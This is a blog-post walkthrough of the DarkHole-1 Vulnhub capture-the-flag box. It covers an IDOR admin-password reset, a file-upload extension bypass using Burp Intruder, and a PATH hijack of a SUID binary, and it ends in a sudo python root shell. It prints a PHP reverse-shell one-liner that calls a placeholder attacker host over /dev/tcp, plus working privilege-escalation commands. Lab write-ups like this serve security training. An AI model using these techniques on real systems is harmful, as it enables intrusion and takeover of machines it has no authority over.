---
published: true
layout: post
author: mark
date: '2021-08-23 00:00:01 UTC'
tags: ctf vulnhub darkhole
---
Welcome to another day and another writeup. This week we have picked a new box from Vulnhub to haxxor tonight. [DarkHole-1](https://www.vulnhub.com/entry/darkhole-1,724/) (Easy Difficulty)

Watch the [VOD]() on our youtube channel. (link coming soon)

## Prep:
- Get your VMs a running (Kali and _the target_)
- Ensure you have gobuster and seclists installed on your Kali machine.
- Something to drink
- Haxxor music
- Burp Suite capturing all the web browsing goodness.

Just a handy hint. Export your targetip like below and then when you copy the commands no editing your ip into it required.
```
export TARGETIP=192.168.1.19
```

## Write up:
Ok lets get down to business, to defeat the box.
Lets start the same way we start every night. With a nmap scan.
```
nmap -sC -sV $TARGETIP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 06:59 EDT
Nmap scan report for 192.168.1.19
Host is up (0.0016s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)
|   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)
|_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.82 seconds
```

Nice we get back 2 open ports. 80 for a web browsing experience and 22 for some sweet ssh action.

Now lets kick it up a notch with some gobuster enumeration and browsing of the website.
```
gobuster dir -u $TARGETIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x xml,txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,xml,txt,php
[+] Timeout:                 10s
===============================================================
2021/08/22 07:02:07 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 810]
/login.php            (Status: 200) [Size: 2507]
/register.php         (Status: 200) [Size: 2886]
/upload               (Status: 301) [Size: 313] [--> http://192.168.1.19/upload/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.19/css/]   
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.19/js/]    
/logout.php           (Status: 302) [Size: 0] [--> login.php]                    
/config               (Status: 301) [Size: 313] [--> http://192.168.1.19/config/]
/dashboard.php        (Status: 200) [Size: 21]                                   
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
2021/08/22 07:03:53 Finished
===============================================================
```

Browsing the website it seems overall fairly simple with a login button up the top. Nothing much under the hood when we inspect it. Lets take a look at the login page.
Looks like a standard login page and not much when we inspect source again. But there is the option to register a user. Lets register a user and see what happens.
Once we have registered and logged in we see a simple dashboard that allows us to change our details or our password. 
```
http://192.168.1.19/dashboard.php?id=2
```
Also the URL is interesting, it contains a parameter with id=2. Changing to id=1 just gives an error for now :( but it looks like a custom message. Lets check the change password field and if that has proper handling. Key note, it doesn't require your old password to change it :D

Turn on intercept in Burp Suite - Proxy. Then jump back to the website and enter a new password.
Back to burpsuite and we see out password change request. And there is an id value in there.

![BurpPasswordChange.PNG]({{site.baseurl}}/Images/vb-darkhole/BurpPasswordChange.PNG)


Change id to 1 and forward that request on.
Lets see what happens next. No errors returned. Lets see if we can login. Unfortunately we dont know the username but lets guess at some common admin names. I think when going through this initially I guess admin first time and it was correct so `¯\_(ツ)_/¯`
Lets login with the new password we just set. 
```
User: admin
Password: thoseguys
```
And we are in and have a new option to look at. Upload.

Lets pause here for a sec and go back to the gobuster results. 
We notice some interesting folders available. Config and upload. 
```
http://192.168.1.19/config/
```
Browsing the config directory (directory listing is enabled yay), we just see a database.php file which gives us nothing right now.

Browsing upload we notice a jpg but not much else. 
```
http://192.168.1.19/upload/
```
However we did see an upload function in the website just before. Lets go upload a php shell and see what happens.
Lets try upload a reverseshell from burp.

```
touch rev.php 
vim rev.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/443 0>&1'");?>
```

Unfortunately, this fails with the following error.
```
Sorry , Allow Ex : jpg,png,gif
```
Lets check if this is just whitelisting jpg,png,gif or blacklisting php/a regex.
Lets send a file again and intercept the upload request with our proxy in Burp. 
Send it over to intruder (CTRL + I) to try a list of extensions in order to determine if the app uses a whitelist or a blacklist:

![BurpIntruderPayload.png]({{site.baseurl}}/Images/vb-darkhole/BurpIntruderPayload.png)

Set the mode to Sniper and clear all the positions. Then highlight the php file extension and click add.

Under payloads we add a list of possible php file extensions from [HackTricks - file upload](https://book.hacktricks.xyz/pentesting-web/file-upload )

```
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
```
If your list includes the . in the file extension make sure to untick the URL-encode setting:

![BurpSettingURLEncode.png]({{site.baseurl}}/Images/vb-darkhole/BurpSettingURLEncode.png)

Click start attack.
Scrolling through the list of extensions we can see that our .phtml file uploaded:

![BurpAttack.png]({{site.baseurl}}/Images/vb-darkhole/BurpAttack.png)

It even gives us a link to access the file! How handy.

Ok lets set up the listener and hit one of the files that burp presented to us.
```
nc -nlvp 443
```
or browse to the upload directory and click on the file.
```
http://192.168.1.19/upload/rev.phtml
```

And we have our shell as www-data

```
listening on [any] 443 ...
connect to [192.168.1.18] from (UNKNOWN) [192.168.1.19] 39730
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
```

So lets start with some standard enumeration and exploration.


```
www-data@darkhole:/var/www/html/upload$ cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
darkhole:x:1000:1000:john:/home/darkhole:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
```
We have two intersting users 'John' and 'darkhole' in there. 

While searching around John’s home directory to see if we might happen to be able to add our own ssh keys, we notice that John also has a root owned binary called toto that has a sticky bit set:

```
www-data@darkhole:/home/john$ ls -la
total 72
drwxrwxrwx 5 john john      4096 Jul 17 22:16 .
drwxr-xr-x 4 root root      4096 Jul 16 09:58 ..
-rw------- 1 john john      1722 Jul 17 21:40 .bash_history
-rw-r--r-- 1 john john       220 Jul 16 09:58 .bash_logout
-rw-r--r-- 1 john john      3771 Jul 16 09:58 .bashrc
drwx------ 2 john john      4096 Jul 17 20:35 .cache
drwxrwxr-x 3 john john      4096 Jul 17 16:59 .local
-rw------- 1 john john        37 Jul 17 16:42 .mysql_history
-rw-r--r-- 1 john john       807 Jul 16 09:58 .profile
drwxrwx--- 2 john www-data  4096 Jul 17 21:08 .ssh
-rwxrwx--- 1 john john         1 Jul 17 21:27 file.py
-rwxrwx--- 1 john john         8 Jul 17 21:12 password
-rwsr-xr-x 1 root root     16784 Jul 17 20:22 toto
-rw-rw---- 1 john john        24 Jul 17 21:47 user.txt
```

We know that we have directory listing enabled on the /upload directory so we copy the binary there so that we can easily download it and do some offline reverse engineering:

```
www-data@darkhole:/home/john$ cp toto /var/www/html/upload
```
Download toto to your kali machine.
Running toto locally we can see it just outputs what looks like the same output as the command `id`

```
./toto       
uid=1001 gid=0(root) groups=0(root),141(kaboxer)
```
Opening the binary with a reversing tool such as Ghidra shows us that our suspicions are correct:

![Ghidra.png]({{site.baseurl}}/Images/vb-darkhole/Ghidra.png)

when we look at the $PATH variable we can see that the command `id` is coming from `/usr/bin/id`

```
www-data@darkhole:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
```
www-data@darkhole:/$ which id
/usr/bin/id
```

Luckily, $PATH is something we can control. So we can essentially alias the `id` command with anything we want if we create our own file and tell $PATH to use it first.

We always have write permissions to /tmp so lets start there.

Create a file called `id` in /tmp with a command in it. for example if we wanted to read the password file in johns diretory.
```
cat /home/john/password
```
```
www-data@darkhole:/home/john$ cd /tmp
www-data@darkhole:/tmp$ echo 'cat /home/john/password' > id
www-data@darkhole:/tmp$ ls -la
total 12
drwxrwxrwt  2 root     root     4096 Aug 23 03:55 .
drwxr-xr-x 20 root     root     4096 Jul 15 18:14 ..
-rw-r--r--  1 www-data www-data   24 Aug 23 03:55 id
www-data@darkhole:/tmp$ cat id
cat /home/john/password
```

Lets give the file execute permissions:
```
www-data@darkhole:/tmp$ chmod +x id
```
then update the $PATH:
```
www-data@darkhole:/tmp$ export PATH=/tmp:$PATH
```
```
www-data@darkhole:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

We use :$PATH in our export so that we don’t overwrite the existing variable, but just perpend our /tmp directory so that it gets checked first. now if we `which id` we see ours will run. and if we try to run it directly we get a permission denied error
```
www-data@darkhole:/tmp$ which id
/tmp/id
www-data@darkhole:/tmp$ id
cat: /home/john/password: Permission denied
```

Time to see what the binary does:
```
www-data@darkhole:/home/john$ ./toto
root123
```

and we have a password. which looking at it, we easily could have guessed/brute forced.

Now we could su up to John and steal the ssh private key we discovered earlier, but looking at the SSH config, password auth it good enough:

```
ssh john@$TARGETIP  
john@192.168.1.164's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Aug 2021 04:00:44 AM UTC

  System load:  0.15               Processes:              229
  Usage of /:   38.3% of 18.57GB   Users logged in:        0
  Memory usage: 43%                IPv4 address for ens33: 192.168.1.164
  Swap usage:   0%


2 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 17 21:46:18 2021
john@darkhole:~$ 
```

Now that we are John, we restart our enumeration of the file system. In the bash_history we notice something interesting:
```
cat .bash_history 
ssh-copy-id root@192.168.135.129
ls
cd .ssh
ls
ssh-copy-id -i id_rsa.pub root@192.168.135.129
ls
cat id_rsa
cat id_rsa.pub 
ssh-copy-id root@192.168.135.129
sudo mysql
mysql
su root
su darkhole
ls
mysql -u john -p
su root
gvv
gcc
apt install gcc
sudo apt install gcc
su root
nano toto.c
clear
cat /etc/passwd
cd -
ls
cd ~
ls
su root
mysql -u john -p
mysql -u jonh -p john
mysql -u john -p darkhole < darkhole.sql 
mysql -u john -p
mysql -u john -p darkhole < darkhole.sql 
mysql -u john
mysql -u john -p
service apache2 restart 
php -b
php -v
cd DarkHole/
ls
nano login.php 
su root
su root
mysql -u jonh -p
ls
l
ls
mysql
mysql -u john
mysql -u john -p
ls
su root
mysql -u john -o 
mysql -u john -p
cd /var/
cd www
cd html/
cd DarkHole/
ls
cd config/
nano database.php 
su root
ls
sudo -l
ssh-keygen -t RSA
ssh-copy-id root@192.168.135.129
ssh-copy-id
/usr/bin/ssh-copy-id root@localhsot
/usr/bin/ssh-copy-id root@localhost
ssh-copy-id
ssh root@192.168.135.129
ls -la
chmod 770 .ssh
cd .ssh
ls
ssh-copy-id
ssh-copy-id id_rsa.pub root@192.168.135.129
ssh-copy-id -i id_rsa.pub root@192.168.135.129
copy-id
ssh-copy-id -i id_rsa.pub root@192.168.135.129
id
ls
nano file.py
echo "import" > file.py
cat file.py
exit
ssh-copy-id root@192.168.135.129
clear
ls
nano file.py 
touch file.py
touch password
nano password 
ls
nano file.py 
chmod 770 file.py 
sudo -l
/usr/bin/python3 /home/john/file.py
ls
chmod 770 password
cat password
nano file.py 
sudo -l
nano file.py 
sudo -l
sudo /usr/bin/python3 /home/john/file.py
clear
id
exit
cat password
exit
mysql -u john -p darkhole < darkhole.sql 
mysql
su root
mysql -u john
mysql -u john -p
wget http://192.168.56.1/darkhole.sql
su rootwget http://192.168.56.1/darkhole.sql
su root
```
Not only is there some sudoing going on, but lots of focus on the file.py.

At the moment its completely empty, but the reason becomes clear when we look at sudoers:
```
john@darkhole:~$ sudo -l
Matching Defaults entries for john on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
```

This makes our next step very easy. use a basic script to spawn a bash shell:

```
john@darkhole:~$ echo 'import pty;
> pty.spawn("/bin/bash")' > file.py
```
```
john@darkhole:~$ cat file.py
import pty;
pty.spawn("/bin/bash")
```

run the file with sudo and we get root!
```
john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py
root@darkhole:/home/john# 
```

```
root@darkhole:/home/john# whoami
root
```
